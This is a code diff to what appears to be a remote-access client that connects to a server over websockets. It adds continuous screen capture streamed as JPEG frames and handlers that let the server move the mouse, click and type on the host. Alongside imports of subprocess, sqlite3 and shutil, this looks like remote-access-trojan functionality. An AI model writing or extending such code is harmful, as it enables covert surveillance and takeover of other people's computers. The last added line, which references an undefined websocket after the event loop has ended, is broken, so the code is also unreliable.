@@ -1,10 +1,66 @@
 import asyncio
+
+async def screen_stream(ws):
+    import mss
+    import io
+    from PIL import Image
+    import base64
+    import asyncio
+    import pyautogui
+    sct = mss.mss()
+    monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
+    width, height = monitor['width'], monitor['height']
+    while True:
+        img = sct.grab(monitor)
+        # Convert to PIL Image
+        im = Image.frombytes('RGB', (img.width, img.height), img.rgb)
+        # Resize to reduce bandwidth if needed; here send full
+        buf = io.BytesIO()
+        im.save(buf, format='JPEG', quality=50)
+        img_bytes = buf.getvalue()
+        b64 = base64.b64encode(img_bytes).decode('utf-8')
+        try:
+            await ws.send_json({'action':'screen_frame','data':b64})
+        except Exception:
+            break
+        await asyncio.sleep(0.5)  # ~2 FPS
+
+async def handle_control(data):
+    import pyautogui
+    action = data.get('type')
+    # Normalize coords
+    width, height = pyautogui.size()
+    x_norm = data.get('x')
+    y_norm = data.get('y')
+    if x_norm is not None and y_norm is not None:
+        x = int(x_norm * width)
+        y = int(y_norm * height)
+    if action == 'mouse_move':
+        pyautogui.moveTo(x, y)
+    elif action == 'mouse_click':
+        button = data.get('button', 'left')
+        pyautogui.click(x, y, button=button)
+    elif action == 'mouse_down':
+        button = data.get('button', 'left')
+        pyautogui.mouseDown(x, y, button=button)
+    elif action == 'mouse_up':
+        button = data.get('button', 'left')
+        pyautogui.mouseUp(x, y, button=button)
+    elif action == 'key_press':
+        key = data.get('key')
+        if key:
+            pyautogui.press(key)
+
 import websockets
 import json
 import subprocess
 import os
 import base64
 import mss
+from PIL import Image
+import io
+import pyautogui
+
 import platform
 import sqlite3
 import shutil
@@ -430,3 +486,5 @@ async def connect_to_server():
 
 if __name__ == "__main__":
     asyncio.run(connect_to_server())
+# Start screen streaming when connected
+asyncio.get_event_loop().create_task(screen_stream(websocket))
